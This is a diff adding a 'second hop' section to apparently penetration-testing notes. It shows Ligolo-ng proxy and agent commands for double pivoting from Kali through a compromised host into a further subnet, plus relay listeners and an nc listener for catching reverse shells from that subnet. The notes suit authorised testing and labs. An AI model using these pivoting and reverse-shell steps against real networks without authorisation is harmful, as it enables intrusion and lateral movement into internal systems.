@@ -84,3 +84,28 @@ Listener on the agent (reverse connection to Kali):
 listener_add --addr 0.0.0.0:<PORT> --to 127.0.0.1:<PORT> --tcp
 ```
 - Verify direction with one connection. Remove stale routes/listeners when done (`route_del`, `listener_stop`).
+
+## Second hop with Ligolo-ng
+Host B sits in the first pivot's network (net1) and reaches net2. Kali cannot reach B directly, so B's agent connects to a listener on the first agent.
+
+1. Net1 is already routed (agent 1, interface `pivot`).
+2. On the proxy console, on session 1, relay B's connections back to the proxy:
+```text
+session
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+```
+3. On B, point the agent at the first pivot's net1 address:
+```bash
+./agent -connect <PIVOT1-NET1-IP>:11601 -ignore-cert
+```
+4. On the proxy console, select the new session and give it its own interface and route:
+```text
+session
+ifcreate --name pivot2
+tunnel_start --tun pivot2
+route_add --name pivot2 --route <SUBNET2>/24
+```
+- `session` lists agents; choose agent 2 (the one with B's hostname) before `tunnel_start`.
+- Net2 route must not overlap net1 or Kali's own networks. Test one known port in net2 from Kali.
+- Reverse shells from net2 hosts: add `listener_add --addr 0.0.0.0:<PORT> --to 127.0.0.1:<PORT> --tcp` on agent 2 (session 2), point the payload at B's net2 address and `<PORT>`, and keep `nc -lvnp <PORT>` on Kali.
+- Port in use on the first agent → pick another `--addr` port for the agent-2 connection and adjust `-connect`.
